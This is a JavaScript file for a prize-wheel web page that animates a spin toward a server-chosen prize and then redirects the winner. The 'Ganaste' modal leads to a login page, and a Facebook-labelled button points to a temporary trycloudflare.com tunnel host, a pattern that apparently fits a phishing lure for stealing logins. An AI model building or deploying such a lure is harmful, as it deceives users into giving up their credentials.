const premiosContainer = document.getElementById("premios");

const total = premiosData.length;
const radio = 110;

for (let i = 0; i < total; i++) {
    const img = document.createElement("img");
    img.src = premiosData[i];
    img.classList.add("premio-img");

    const angulo = (380 / total) * i - 70;
    const rad = angulo * Math.PI / 180;

    const x = 180 + radio * Math.cos(rad);
    const y = 180 + radio * Math.sin(rad);

    img.style.left = `${x}px`;
    img.style.top = `${y}px`;

    premiosContainer.appendChild(img);
}

document.getElementById("btn-girar").addEventListener("click", () => {

    const ruleta = document.getElementById("ruleta");
    const premios = document.getElementById("premios");

    const imgGanador = document.getElementById("imagen-ganador");
    const tituloGanador = document.getElementById("titulo-ganador");

    imgGanador.style.display = "none";
    tituloGanador.innerText = "";

    fetch('/sortear', { method: "POST" })
        .then(res => res.json())
        .then(data => {

            console.log("Premio recibido:", data);

            const index = data.index;
            const total = premiosData.length;
            const tamsector = 360 / total;

            const anguloObjetivo = index * tamsector;

            const grados = (360 * 10) + (360 - anguloObjetivo - tamsector/2);

            ruleta.style.transform = `rotate(${grados}deg)`;
            premios.style.transform = `rotate(${grados}deg)`;

            setTimeout(() => {
                document.getElementById("modal-imagen").src = data.imagen;
                document.getElementById("modal-titulo").innerText = "Ganaste: " + data.nombre;

                document.getElementById("modal-premio").style.display = "flex";

             }, 4000);


        })
        .catch(err => console.error(err));

});

document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("aceptar-modal").addEventListener("click", () => {
        document.getElementById("modal-premio").style.display = "none";
        window.location.href = "/iniciosession";
    });
});

document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("Facebook-modal").addEventListener("click", () => {
        document.getElementById("modal-premio").style.display = "none";
        window.location.href = "https://releases-declared-carb-ready.trycloudflare.com";
    });
});